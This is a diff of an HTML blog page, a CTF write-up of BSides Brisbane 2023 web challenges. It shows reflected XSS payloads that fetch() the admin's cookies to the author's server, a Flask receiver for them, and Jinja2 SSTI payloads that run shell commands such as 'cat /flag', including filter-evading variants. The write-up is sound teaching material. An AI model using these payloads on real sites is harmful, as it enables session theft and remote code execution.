@@ -2,18 +2,23 @@
 <html lang="en">
  <head> 
   <meta charset="UTF-8"> 
+  <meta name="fediverse:creator" content="@stackotter@mastodon.social"> 
+  <meta name="viewport" content="width=device-width"> 
+  <meta name="description" content="The BSides Brisbane CTF was an exciting mix of traditional jeopardy challenges, and hardware/enterprise hacking. Huge props to the team who made this top quality CTF happen!"> 
   <link rel="stylesheet" href="/css/page.css"> 
   <link rel="me" href="https://mastodon.social/@stackotter"> 
+  <!-- Google tag (gtag.js) - Google Analytics --> 
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-7ZNG4PJZEX"></script> 
+  <script>
+            window.dataLayer = window.dataLayer || [];
+            function gtag() {
+              dataLayer.push(arguments)
+            };
+            gtag('js', new Date());
+
+            gtag('config', 'G-7ZNG4PJZEX');
+        </script> 
   <title>BSides Brisbane 2023 - Writeups (Part 2: web) - stackotter</title> 
-  <meta name="viewport" content="width=device-width"> 
-  <meta name="description" content="The BSides Brisbane CTF was an exciting mix of traditional jeopardy challenges, and hardware/enterprise hacking. Huge props to the team who made this top quality CTF happen!;
-        gtag('js', new Date());
-
-        gtag('config', 'G-7ZNG4PJZEX');
-    </script>
-
-    <body>
-        <div class=" container"> 
   <link rel="stylesheet" href="/css/page.css">
   <link rel="stylesheet" href="/css/github-markdown-light.css">
   <link rel="stylesheet" href="/css/syntax-theme_atom-one-dark.min.css">
@@ -25,42 +30,43 @@
     background-color: #282c34 !important;
 }</style>
   <script defer src="/js/highlight.min.js"></script>
- </head>
- <body>
-  <header class="header"> 
-   <a href="/" class="logo"> <img src="/image/otter.png" alt="A pixel art otter logo" class="logo"> </a> 
-   <h1 id="stackotter.dev">stackotter.dev</h1> 
-   <div id="nav"> 
-    <a class="link" href="/">about</a> 
-    <a class="link" href="/blog">blog</a> 
-    <a class="link" href="/contact">contact</a> 
-   </div> 
-  </header> 
-  <main class="main"> 
-   <div class="markdown-body"> 
-    <h1 id="bsides-brisbane-2023---writeups-part-2:-web">BSides Brisbane 2023 - Writeups (Part 2: web)</h1> 
-    <p>The BSides Brisbane CTF was an exciting mix of traditional jeopardy challenges, and hardware/enterprise hacking. Huge props to the team who made this top quality CTF happen!</p> 
-    <p>In part 1 I covered all crypto and rev challenges along with an interesting IoT challenge. In this part I’ll cover some of the web challenges, and in the next I’ll cover both of the pwn challenges (this post started getting a bit too long).</p> 
-    <h2 id="overview">Overview</h2> 
-    <p><p class="-table-of-contents">
-      <ul>
-       <li><a href="#xss-green-web---200-points">XSS Green (web - 200 points)</a></li>
-       <li><a href="#xss-blue-web---250-points">XSS Blue (web - 250 points)</a></li>
-       <li><a href="#xss-orange-web---350-points">XSS Orange (web - 350 points)</a></li>
-       <li><a href="#ninja1-web---200-points">ninja1 (web - 200 points)</a></li>
-       <li><a href="#ninja2-web---250-points">ninja2 (web - 250 points)</a></li>
-       <li><a href="#coincidence-web---250-points">Coincidence (web - 250 points)</a></li>
-      </ul></p></p> 
-    <hr> 
-    <h2 id="xss-green-web---200-points">XSS Green (web - 200 points)</h2> 
-    <blockquote> 
-     <p>Can you leak the admin’s cookies?</p> 
-     <p>Author: mnz</p> 
-    </blockquote> 
-    <p>We’re presented with a bright green home page with a single link pointing to a form which we can use to send links to the admin for review. If we send a link to a site we control, we could run arbitrary JavaScript in the admin’s browser, however, we wouldn’t be able to access the cookie. Clearly, we need to find an XSS, and given that the site has such a small surface, it shouldn’t be too hard. But I looked around for 15 minutes or so and didn’t find anything. I knew that I must be missing something.</p> 
-    <p>Later on, Howard let me know that they had found an XSS and just couldn’t figure out how to exploit it. It turns out, the XSS was pretty contrived and I just didn’t see it because I was using Safari with the compact tab layout (which only displays the domain of a site unless you click on the URL input to see the full URL). The XSS primitive was a <code>js</code> query parameter which gets reflected into the site 🤦‍♂️Usually I use Firefox for CTF challenges but I didn’t bother because it was supposedly a simple web challenge. Lesson learnt!</p> 
-    <p>When you visit the homepage without the <code>js</code> parameter, you get redirected to this URL: <code>https://green.web.ctf.bsidesbne.com/?js=your_input_here</code>. A quick inspect element reveals that we’ve been given a reflected XSS (but not quite for free).</p> 
-    <pre><code class="language-html">&lt;html&gt;
+ </head> 
+ <body> 
+  <div class="container"> 
+   <header class="header"> 
+    <a href="/" class="logo"> <img src="/image/otter.png" alt="A pixel art otter logo" class="logo"> </a> 
+    <h1 id="stackotter.dev">stackotter.dev</h1> 
+    <div id="nav"> 
+     <a class="link" href="/">about</a> 
+     <a class="link" href="/blog">blog</a> 
+     <a class="link" href="/contact">contact</a> 
+    </div> 
+   </header> 
+   <main class="main"> 
+    <div class="markdown-body"> 
+     <h1 id="bsides-brisbane-2023---writeups-part-2:-web">BSides Brisbane 2023 - Writeups (Part 2: web)</h1> 
+     <p>The BSides Brisbane CTF was an exciting mix of traditional jeopardy challenges, and hardware/enterprise hacking. Huge props to the team who made this top quality CTF happen!</p> 
+     <p>In part 1 I covered all crypto and rev challenges along with an interesting IoT challenge. In this part I’ll cover some of the web challenges, and in the next I’ll cover both of the pwn challenges (this post started getting a bit too long).</p> 
+     <h2 id="overview">Overview</h2> 
+     <p><p class="-table-of-contents">
+       <ul>
+        <li><a href="#xss-green-web---200-points">XSS Green (web - 200 points)</a></li>
+        <li><a href="#xss-blue-web---250-points">XSS Blue (web - 250 points)</a></li>
+        <li><a href="#xss-orange-web---350-points">XSS Orange (web - 350 points)</a></li>
+        <li><a href="#ninja1-web---200-points">ninja1 (web - 200 points)</a></li>
+        <li><a href="#ninja2-web---250-points">ninja2 (web - 250 points)</a></li>
+        <li><a href="#coincidence-web---250-points">Coincidence (web - 250 points)</a></li>
+       </ul></p></p> 
+     <hr> 
+     <h2 id="xss-green-web---200-points">XSS Green (web - 200 points)</h2> 
+     <blockquote> 
+      <p>Can you leak the admin’s cookies?</p> 
+      <p>Author: mnz</p> 
+     </blockquote> 
+     <p>We’re presented with a bright green home page with a single link pointing to a form which we can use to send links to the admin for review. If we send a link to a site we control, we could run arbitrary JavaScript in the admin’s browser, however, we wouldn’t be able to access the cookie. Clearly, we need to find an XSS, and given that the site has such a small surface, it shouldn’t be too hard. But I looked around for 15 minutes or so and didn’t find anything. I knew that I must be missing something.</p> 
+     <p>Later on, Howard let me know that they had found an XSS and just couldn’t figure out how to exploit it. It turns out, the XSS was pretty contrived and I just didn’t see it because I was using Safari with the compact tab layout (which only displays the domain of a site unless you click on the URL input to see the full URL). The XSS primitive was a <code>js</code> query parameter which gets reflected into the site 🤦‍♂️Usually I use Firefox for CTF challenges but I didn’t bother because it was supposedly a simple web challenge. Lesson learnt!</p> 
+     <p>When you visit the homepage without the <code>js</code> parameter, you get redirected to this URL: <code>https://green.web.ctf.bsidesbne.com/?js=your_input_here</code>. A quick inspect element reveals that we’ve been given a reflected XSS (but not quite for free).</p> 
+     <pre><code class="language-html">&lt;html&gt;
   &lt;script&gt;
     function deadcode(){
       /*your_input_here */
@@ -73,13 +79,13 @@
   &lt;/body&gt;
 &lt;/html&gt;
 </code></pre> 
-    <p>Figure 1: <em>the source of the page, notice that the value of the <code>js</code> parameter included verbatim in the script tags.</em></p> 
-    <p>To exploit this vulnerability we need to find an input that will allow us to escape the comment, escape the function, and then insert code that will send the admin’s cookie back to us. We also need to ensure that the code after our input doesn’t cause a syntax error, that is the closing brace of the function must be matched by an opening brace in our input.</p> 
-    <pre><code class="language-js">*/}fetch("https://backend.stackotter.dev:8000/?"+document.cookie);{/*
+     <p>Figure 1: <em>the source of the page, notice that the value of the <code>js</code> parameter included verbatim in the script tags.</em></p> 
+     <p>To exploit this vulnerability we need to find an input that will allow us to escape the comment, escape the function, and then insert code that will send the admin’s cookie back to us. We also need to ensure that the code after our input doesn’t cause a syntax error, that is the closing brace of the function must be matched by an opening brace in our input.</p> 
+     <pre><code class="language-js">*/}fetch("https://backend.stackotter.dev:8000/?"+document.cookie);{/*
 </code></pre> 
-    <p>Figure 2: <em>the payload I used to exfiltrate the admin’s cookie.</em></p> 
-    <p>First, I escaped the comment and the function simply by closing them, then I used <code>fetch</code> to send the admin’s cookie to a server I control, then I used a <code>{</code> to ensure that the original closing brace was matched (it’ll get parsed as an empty object), and finally I used a <code>/*</code> to ensure that the closing delimiter of the comment we escaped gets matched.</p> 
-    <pre><code class="language-js">function deadcode(){
+     <p>Figure 2: <em>the payload I used to exfiltrate the admin’s cookie.</em></p> 
+     <p>First, I escaped the comment and the function simply by closing them, then I used <code>fetch</code> to send the admin’s cookie to a server I control, then I used a <code>{</code> to ensure that the original closing brace was matched (it’ll get parsed as an empty object), and finally I used a <code>/*</code> to ensure that the closing delimiter of the comment we escaped gets matched.</p> 
+     <pre><code class="language-js">function deadcode(){
   /**/}fetch("https://backend.stackotter.dev:8000/?"+document.cookie);{/* */
 }
 
@@ -88,15 +94,15 @@ function deadcode() {}
 fetch("https://backend.stackotter.dev:8000/?"+document.cookie);
 {}
 </code></pre> 
-    <p>Figure 3: <em>the payloaded inserted into the original script and cleaned up to demonstrate how it works.</em></p> 
-    <p>Putting this payload through CyberChef’s <code>URL Encode</code> recipe with <code>Encode all special chars</code> enabled gives us the value to pass to <code>js</code> in the URL. Sending the following URL to the admin successfully got the admin’s cookie to turn up in the logs of the server I controlled; <a href="https://green.web.ctf.bsidesbne.com/?js=%2A%2F%7Dfetch%28%22https%3A%2F%2Fbackend%2Estackotter%2Edev%3A8000%2F%3F%22%2Bdocument%2Ecookie%29%3B%7B%2F%2A">https://green.web.ctf.bsidesbne.com/?js=%2A%2F%7Dfetch%28%22https%3A%2F%2Fbackend%2Estackotter%2Edev%3A8000%2F%3F%22%2Bdocument%2Ecookie%29%3B%7B%2F%2A</a></p> 
-    <pre><code>3.24.244.16 - - [23/Jul/2023 12:52:31] "GET /?flag=flag{77eeaaa231a792f0e8f2f650a12e6929} HTTP/1.1" 200 -
+     <p>Figure 3: <em>the payloaded inserted into the original script and cleaned up to demonstrate how it works.</em></p> 
+     <p>Putting this payload through CyberChef’s <code>URL Encode</code> recipe with <code>Encode all special chars</code> enabled gives us the value to pass to <code>js</code> in the URL. Sending the following URL to the admin successfully got the admin’s cookie to turn up in the logs of the server I controlled; <a href="https://green.web.ctf.bsidesbne.com/?js=%2A%2F%7Dfetch%28%22https%3A%2F%2Fbackend%2Estackotter%2Edev%3A8000%2F%3F%22%2Bdocument%2Ecookie%29%3B%7B%2F%2A">https://green.web.ctf.bsidesbne.com/?js=%2A%2F%7Dfetch%28%22https%3A%2F%2Fbackend%2Estackotter%2Edev%3A8000%2F%3F%22%2Bdocument%2Ecookie%29%3B%7B%2F%2A</a></p> 
+     <pre><code>3.24.244.16 - - [23/Jul/2023 12:52:31] "GET /?flag=flag{77eeaaa231a792f0e8f2f650a12e6929} HTTP/1.1" 200 -
 </code></pre> 
-    <p>Figure 4: <em>the server logs containing the flag.</em></p> 
-    <p>Flag: <code>flag{77eeaaa231a792f0e8f2f650a12e6929}</code></p> 
-    <p>Note that I had to use an <code>https</code> web server with my payload because of CORS, but it turns out that by using fetch’s <code>no-cors</code> mode to ignore CORS I could’ve used a regular <code>http</code> server. Using <code>no-cors</code> restricts what parts of the request we can control and what parts of the response we can read, but that doesn’t matter in this case. Thanks OMGasm for pointing out this improvement after the CTF!</p> 
-    <p>I have included the simple server code that I used, it really wasn’t anything fancy. If you don’t have a server available, I’ve heard that you can also try <a href="https://ngrok.com">ngrok</a> for these kinds of challenges.</p> 
-    <pre><code class="language-python">from flask import Flask
+     <p>Figure 4: <em>the server logs containing the flag.</em></p> 
+     <p>Flag: <code>flag{77eeaaa231a792f0e8f2f650a12e6929}</code></p> 
+     <p>Note that I had to use an <code>https</code> web server with my payload because of CORS, but it turns out that by using fetch’s <code>no-cors</code> mode to ignore CORS I could’ve used a regular <code>http</code> server. Using <code>no-cors</code> restricts what parts of the request we can control and what parts of the response we can read, but that doesn’t matter in this case. Thanks OMGasm for pointing out this improvement after the CTF!</p> 
+     <p>I have included the simple server code that I used, it really wasn’t anything fancy. If you don’t have a server available, I’ve heard that you can also try <a href="https://ngrok.com">ngrok</a> for these kinds of challenges.</p> 
+     <pre><code class="language-python">from flask import Flask
 from flask_cors import CORS
 
 app = Flask(__name__)
@@ -109,28 +115,28 @@ def index():
 # Cert generated by certbot and was already installed on the server for another website.
 app.run("0.0.0.0", 8000, ssl_content=("keyfile.pem", "privkey.pem"))
 </code></pre> 
-    <p>Figure 5: *the server code used to receive the flag from the admin’s browser.</p> 
-    <h3 id="conclusion">Conclusion</h3> 
-    <p>The challenge was a nice simple reflected XSS, if only I’d seen the query parameter 🤦‍♂️.</p> 
-    <hr> 
-    <h2 id="xss-blue-web---250-points">XSS Blue (web - 250 points)</h2> 
-    <blockquote> 
-     <p>Can you leak the admin’s cookies?</p> 
-     <p>Author: mnz</p> 
-    </blockquote> 
-    <p>We’re basically presented with the exact same site as XSS Green, expect this time it’s blue! (and our input is injected into a slightly more annoying part of the script tag).</p> 
-    <pre><code class="language-js">function deadcode() {
+     <p>Figure 5: *the server code used to receive the flag from the admin’s browser.</p> 
+     <h3 id="conclusion">Conclusion</h3> 
+     <p>The challenge was a nice simple reflected XSS, if only I’d seen the query parameter 🤦‍♂️.</p> 
+     <hr> 
+     <h2 id="xss-blue-web---250-points">XSS Blue (web - 250 points)</h2> 
+     <blockquote> 
+      <p>Can you leak the admin’s cookies?</p> 
+      <p>Author: mnz</p> 
+     </blockquote> 
+     <p>We’re basically presented with the exact same site as XSS Green, expect this time it’s blue! (and our input is injected into a slightly more annoying part of the script tag).</p> 
+     <pre><code class="language-js">function deadcode() {
   var params = {};
   params['noot'] = "your_input_here";
   params['doot'] = 'your_input_here';
 }
 </code></pre> 
-    <p>Figure 6: <em>the script that our input gets inserted into.</em></p> 
-    <p>To approach this problem I started out with my working payload for XSS Green and started to modify it. Initially I aimed to just get the payload working for the second string while ignoring the first string. Then, since the two strings used different quotation marks I could modify the payload so that it was basically a bunch of benign code when inserted into the first string. It’s hard to explain the process I used as it was essentially just intuition, but the core idea is that by using the two types of quotes, the two insertion points will interpret different parts of the input as syntax highlighting will show you below.</p> 
-    <pre><code class="language-js">";';} fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);{ //'//
+     <p>Figure 6: <em>the script that our input gets inserted into.</em></p> 
+     <p>To approach this problem I started out with my working payload for XSS Green and started to modify it. Initially I aimed to just get the payload working for the second string while ignoring the first string. Then, since the two strings used different quotation marks I could modify the payload so that it was basically a bunch of benign code when inserted into the first string. It’s hard to explain the process I used as it was essentially just intuition, but the core idea is that by using the two types of quotes, the two insertion points will interpret different parts of the input as syntax highlighting will show you below.</p> 
+     <pre><code class="language-js">";';} fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);{ //'//
 </code></pre> 
-    <p>Figure 7: <em>my payload for XSS Blue.</em></p> 
-    <pre><code class="language-js">function deadcode() {
+     <p>Figure 7: <em>my payload for XSS Blue.</em></p> 
+     <pre><code class="language-js">function deadcode() {
   var params = {};
   params['noot'] = "";';} fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);{ //'//";
   params['doot'] = '";';} fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);{ //'//';
@@ -146,23 +152,23 @@ function deadcode() {
 fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);
 {}
 </code></pre> 
-    <p>Figure 8: <em>the script after having the payload inserted into it.</em></p> 
-    <p>As you can see from the syntax highlighting, at the first insertion site our payload is basically just ignored as one big string followed by a comment. In contrast, the second one escapes the function, sends the cookie to our server, and matches the function’s original closing brace just as my payload for XSS Green did.</p> 
-    <p>URL encoding the payload (from Figure 7) and passing that as the <code>js</code> query parameter of the URL we send to the admin gives us the flag; <a href="https://blue.web.ctf.bsidesbne.com/?js=%22%3B%27%3B%7D%20fetch%28%60https%3A%2F%2Fbackend.stackotter.dev%3A8000%2F%3F%60%2Bdocument.cookie%29%3B%7B%20%2F%2F%27%2F%2F">https://blue.web.ctf.bsidesbne.com/?js=%22%3B%27%3B%7D%20fetch%28%60https%3A%2F%2Fbackend.stackotter.dev%3A8000%2F%3F%60%2Bdocument.cookie%29%3B%7B%20%2F%2F%27%2F%2F</a></p> 
-    <pre><code>3.24.244.16 - - [23/Jul/2023 13:29:40] "GET /?flag=flag{e7eaae85f7c752303c9d4520a06ccc39} HTTP/1.1" 200 -
+     <p>Figure 8: <em>the script after having the payload inserted into it.</em></p> 
+     <p>As you can see from the syntax highlighting, at the first insertion site our payload is basically just ignored as one big string followed by a comment. In contrast, the second one escapes the function, sends the cookie to our server, and matches the function’s original closing brace just as my payload for XSS Green did.</p> 
+     <p>URL encoding the payload (from Figure 7) and passing that as the <code>js</code> query parameter of the URL we send to the admin gives us the flag; <a href="https://blue.web.ctf.bsidesbne.com/?js=%22%3B%27%3B%7D%20fetch%28%60https%3A%2F%2Fbackend.stackotter.dev%3A8000%2F%3F%60%2Bdocument.cookie%29%3B%7B%20%2F%2F%27%2F%2F">https://blue.web.ctf.bsidesbne.com/?js=%22%3B%27%3B%7D%20fetch%28%60https%3A%2F%2Fbackend.stackotter.dev%3A8000%2F%3F%60%2Bdocument.cookie%29%3B%7B%20%2F%2F%27%2F%2F</a></p> 
+     <pre><code>3.24.244.16 - - [23/Jul/2023 13:29:40] "GET /?flag=flag{e7eaae85f7c752303c9d4520a06ccc39} HTTP/1.1" 200 -
 </code></pre> 
-    <p>Figure 9: <em>the line of the server logs containing the flag.</em></p> 
-    <p>Flag: <code>flag{e7eaae85f7c752303c9d4520a06ccc39}</code></p> 
-    <p>The solution could’ve been improved in the same ways as XSS Green, but overall I think it was probably pretty close to the intended solution.</p> 
-    <hr> 
-    <h2 id="xss-orange-web---350-points">XSS Orange (web - 350 points)</h2> 
-    <blockquote> 
-     <p>Can you leak the admin’s cookies?</p> 
-     <p>Author: mnz</p> 
-    </blockquote> 
-    <p>Again this challenge was pretty similar to XSS Blue and XSS Green in nature, except this time the website was orange! (surprise)</p> 
-    <p>The main twist this time was that there were now blocked keywords (such as <code>window</code> and <code>function</code>). Also, our input now gets put in 3 spots.</p> 
-    <pre><code class="language-js">function deadcode(your_input_here) {
+     <p>Figure 9: <em>the line of the server logs containing the flag.</em></p> 
+     <p>Flag: <code>flag{e7eaae85f7c752303c9d4520a06ccc39}</code></p> 
+     <p>The solution could’ve been improved in the same ways as XSS Green, but overall I think it was probably pretty close to the intended solution.</p> 
+     <hr> 
+     <h2 id="xss-orange-web---350-points">XSS Orange (web - 350 points)</h2> 
+     <blockquote> 
+      <p>Can you leak the admin’s cookies?</p> 
+      <p>Author: mnz</p> 
+     </blockquote> 
+     <p>Again this challenge was pretty similar to XSS Blue and XSS Green in nature, except this time the website was orange! (surprise)</p> 
+     <p>The main twist this time was that there were now blocked keywords (such as <code>window</code> and <code>function</code>). Also, our input now gets put in 3 spots.</p> 
+     <pre><code class="language-js">function deadcode(your_input_here) {
   if (your_input_here) {
     var params = {};
     params['noot'] = "your_input_here";
@@ -170,13 +176,13 @@ fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);
   }
 }
 </code></pre> 
-    <p>Figure 10: <em>the script that our input gets inserted into.</em></p> 
-    <p>I’ll try my best to explain the rough thought process I followed (as much of it as I can remember), but honestly these kinds of challenges are mostly just intuition with trial and error for me so it’s pretty hard to give solid advice on how to solve them.</p> 
-    <p>The first thing to notice is that the third location (the double quoted string) is the odd one out and we can easily just ignore it by not using newlines or double quotes. This simplifies things a bit. Next, we can see that the biggest challenge is that the first insertion point has to end up looking like a function parameter list (which is quite a bit stricter than the if condition insertion point). Because of that observation, I started my payload with <code>x)</code> to make that valid and immediately escape it. Next I provided a function body that sends the cookie to our server, and after the function body I call <code>deadcode</code>. Now we just need to make sure that the payload cleanly matches up all of the closing delimiters of the things that it escaped. Because the <code>function</code> keyword is blocked we can’t simply use <code>function (</code> to match <code>) {</code>, but luckily we can just use a comment to ignore the <code>) {</code> immediately after our input and then use <code>() =&gt; {</code> to match the original closing brace of the function. We can’t just use <code>{</code> because there’s an if statement between the braces, which wouldn’t be valid as part of an object literal. With a few tweaks it’s not too difficult to ensure that the payload quietly works at the if statement insertion point too (it doesn’t actually get run so it just needs to be syntactically valid).</p> 
-    <pre><code class="language-js">x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () =&gt; {//
+     <p>Figure 10: <em>the script that our input gets inserted into.</em></p> 
+     <p>I’ll try my best to explain the rough thought process I followed (as much of it as I can remember), but honestly these kinds of challenges are mostly just intuition with trial and error for me so it’s pretty hard to give solid advice on how to solve them.</p> 
+     <p>The first thing to notice is that the third location (the double quoted string) is the odd one out and we can easily just ignore it by not using newlines or double quotes. This simplifies things a bit. Next, we can see that the biggest challenge is that the first insertion point has to end up looking like a function parameter list (which is quite a bit stricter than the if condition insertion point). Because of that observation, I started my payload with <code>x)</code> to make that valid and immediately escape it. Next I provided a function body that sends the cookie to our server, and after the function body I call <code>deadcode</code>. Now we just need to make sure that the payload cleanly matches up all of the closing delimiters of the things that it escaped. Because the <code>function</code> keyword is blocked we can’t simply use <code>function (</code> to match <code>) {</code>, but luckily we can just use a comment to ignore the <code>) {</code> immediately after our input and then use <code>() =&gt; {</code> to match the original closing brace of the function. We can’t just use <code>{</code> because there’s an if statement between the braces, which wouldn’t be valid as part of an object literal. With a few tweaks it’s not too difficult to ensure that the payload quietly works at the if statement insertion point too (it doesn’t actually get run so it just needs to be syntactically valid).</p> 
+     <pre><code class="language-js">x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () =&gt; {//
 </code></pre> 
-    <p>Figure 11: <em>the final payload.</em></p> 
-    <pre><code class="language-js">function deadcode(x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () =&gt; {//) {
+     <p>Figure 11: <em>the final payload.</em></p> 
+     <pre><code class="language-js">function deadcode(x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () =&gt; {//) {
   if (x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () =&gt; {//) {
     var params = {};
     params['noot'] = "x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () =&gt; {//";
@@ -201,43 +207,43 @@ var y = () =&gt; {
   }
 }
 </code></pre> 
-    <p>Figure 12: <em>the script after having the payload inserted into it.</em></p> 
-    <p>Luckily JavaScript is very relaxed, because otherwise we might’ve had to work a bit more to get this payload working 😅.</p> 
-    <pre><code>3.24.244.16 - - [23/Jul/2023 13:36:41] "GET /?flag=flag{ed8a00ce2b82a9028a5d06ebbefb26582c0c98fc} HTTP/1.1" 200 -
+     <p>Figure 12: <em>the script after having the payload inserted into it.</em></p> 
+     <p>Luckily JavaScript is very relaxed, because otherwise we might’ve had to work a bit more to get this payload working 😅.</p> 
+     <pre><code>3.24.244.16 - - [23/Jul/2023 13:36:41] "GET /?flag=flag{ed8a00ce2b82a9028a5d06ebbefb26582c0c98fc} HTTP/1.1" 200 -
 </code></pre> 
-    <p>Figure 13: <em>the line of the server logs containing the flag.</em></p> 
-    <p>Flag: <code>flag{ed8a00ce2b82a9028a5d06ebbefb26582c0c98fc}</code></p> 
-    <h3 id="conclusion">Conclusion</h3> 
-    <p>This challenge was pretty interesting to solve and was a nice follow on challenge from the previous two XSS challenges that I had solved. However, the fact that the web category had two of these lucrative ‘challenge series’s meant that the pwn challenges didn’t have much value in terms of points. I spent an hour-ish total to solve the three of the XSS challenges for 800 points, but spent multiple hours on <code>protec</code> (a pwn challenge that didn’t get a second solve right until the end) for just 350 points. The CTF devs did a great job with the CTF, but I think the scoring could do with some tuning next year.</p> 
-    <hr> 
-    <h2 id="ninja1-web---200-points">ninja1 (web - 200 points)</h2> 
-    <blockquote> 
-     <p>I made a super secure website!</p> 
-     <p>Author: deluqs</p> 
-    </blockquote> 
-    <p>We’re presented with a website which allows us to; sign up, log in, change our details, view our details, and see a dev page which shows how many people have signed up. I looked around for a little while trying to create accounts and change their usernames to contain HTML, SSTI payloads and SQLi payloads, but I couldn’t see any signs that any of them had done anything. That’s when I realised that the very janky looking dev page contained our username in a message along the lines of; <code>hi username, there are 4 people registered</code>. Given that the page was simply just text without any styles whatsoever, I was pretty suspicious that it might be vulnerable to <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti">SSTI</a>. I was suspicious because often SSTI will occur when a dev tries to hack together a page quickly and can’t be bothered creating a new template file so they just give Flask the template as a string (forgetting that it shouldn’t contain user input).</p> 
-    <p>I once again set my username to the classic <code>{{7*7}}</code> SSTI payload (no clue why it’s a classic), and it worked! On the dev page my username was displayed as <code>49</code>. I changed my username a few more times to run <code>ls</code> and <code>ls /</code> followed by <code>cat /flag</code>, and found the flag pretty quickly.</p> 
-    <pre><code class="language-python">{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
+     <p>Figure 13: <em>the line of the server logs containing the flag.</em></p> 
+     <p>Flag: <code>flag{ed8a00ce2b82a9028a5d06ebbefb26582c0c98fc}</code></p> 
+     <h3 id="conclusion">Conclusion</h3> 
+     <p>This challenge was pretty interesting to solve and was a nice follow on challenge from the previous two XSS challenges that I had solved. However, the fact that the web category had two of these lucrative ‘challenge series’s meant that the pwn challenges didn’t have much value in terms of points. I spent an hour-ish total to solve the three of the XSS challenges for 800 points, but spent multiple hours on <code>protec</code> (a pwn challenge that didn’t get a second solve right until the end) for just 350 points. The CTF devs did a great job with the CTF, but I think the scoring could do with some tuning next year.</p> 
+     <hr> 
+     <h2 id="ninja1-web---200-points">ninja1 (web - 200 points)</h2> 
+     <blockquote> 
+      <p>I made a super secure website!</p> 
+      <p>Author: deluqs</p> 
+     </blockquote> 
+     <p>We’re presented with a website which allows us to; sign up, log in, change our details, view our details, and see a dev page which shows how many people have signed up. I looked around for a little while trying to create accounts and change their usernames to contain HTML, SSTI payloads and SQLi payloads, but I couldn’t see any signs that any of them had done anything. That’s when I realised that the very janky looking dev page contained our username in a message along the lines of; <code>hi username, there are 4 people registered</code>. Given that the page was simply just text without any styles whatsoever, I was pretty suspicious that it might be vulnerable to <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti">SSTI</a>. I was suspicious because often SSTI will occur when a dev tries to hack together a page quickly and can’t be bothered creating a new template file so they just give Flask the template as a string (forgetting that it shouldn’t contain user input).</p> 
+     <p>I once again set my username to the classic <code>{{7*7}}</code> SSTI payload (no clue why it’s a classic), and it worked! On the dev page my username was displayed as <code>49</code>. I changed my username a few more times to run <code>ls</code> and <code>ls /</code> followed by <code>cat /flag</code>, and found the flag pretty quickly.</p> 
+     <pre><code class="language-python">{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag').read() }}
 </code></pre> 
-    <p>Figure 14: <em>the payloads I used to locate and read the flag.</em></p> 
-    <p>Flag: <code>flag{th4t-w4s-@-whoopssti}</code></p> 
-    <h3 id="conclusion">Conclusion</h3> 
-    <p>This was a nice introductory SSTI with a few more elements to figure out than usual, making it that much more fun! Very well made challenge with an element of realism.</p> 
-    <hr> 
-    <h2 id="ninja2-web---250-points">ninja2 (web - 250 points)</h2> 
-    <blockquote> 
-     <p>Ok I’ve learnt from my mistakes, hackers won’t be able to get in this time. [Period].</p> 
-     <p>Author: deluqs</p> 
-    </blockquote> 
-    <p>The attack vector is essentially the same as in ninja1, except this time there are some pesky filters in place! Please note that adding filters is not a safe fix for SSTI in the real world, it’s just a bandaid. The filters block <code>.</code>, <code>[</code>, and <code>]</code>, and later on I found that they may have been interfering with my ability to access members of the <code>self.__init__.__globals__.__builtins__</code> object via <code>attr</code> (although that could just be me misunderstanding Jinja’s <code>attr</code> filter).</p> 
-    <pre><code class="language-python">{{ getattr(getattr(getattr(getattr(getattr(getattr(self, "__init__"), "__globals__"), "__builtins__"), "__import__")('os'), "popen")('ls'), "read")() }}
+     <p>Figure 14: <em>the payloads I used to locate and read the flag.</em></p> 
+     <p>Flag: <code>flag{th4t-w4s-@-whoopssti}</code></p> 
+     <h3 id="conclusion">Conclusion</h3> 
+     <p>This was a nice introductory SSTI with a few more elements to figure out than usual, making it that much more fun! Very well made challenge with an element of realism.</p> 
+     <hr> 
+     <h2 id="ninja2-web---250-points">ninja2 (web - 250 points)</h2> 
+     <blockquote> 
+      <p>Ok I’ve learnt from my mistakes, hackers won’t be able to get in this time. [Period].</p> 
+      <p>Author: deluqs</p> 
+     </blockquote> 
+     <p>The attack vector is essentially the same as in ninja1, except this time there are some pesky filters in place! Please note that adding filters is not a safe fix for SSTI in the real world, it’s just a bandaid. The filters block <code>.</code>, <code>[</code>, and <code>]</code>, and later on I found that they may have been interfering with my ability to access members of the <code>self.__init__.__globals__.__builtins__</code> object via <code>attr</code> (although that could just be me misunderstanding Jinja’s <code>attr</code> filter).</p> 
+     <pre><code class="language-python">{{ getattr(getattr(getattr(getattr(getattr(getattr(self, "__init__"), "__globals__"), "__builtins__"), "__import__")('os'), "popen")('ls'), "read")() }}
 {{ ((((((((self|attr("__init__"))|attr("__globals__"))|attr("__builtins__"))|attr("__import__"))('os'))|attr("popen"))("ls"))|attr("read"))() }}
 </code></pre> 
-    <p>Figure 15: <em>two possible variants of my ninja1 payloads which avoid the blocked characters.</em></p> 
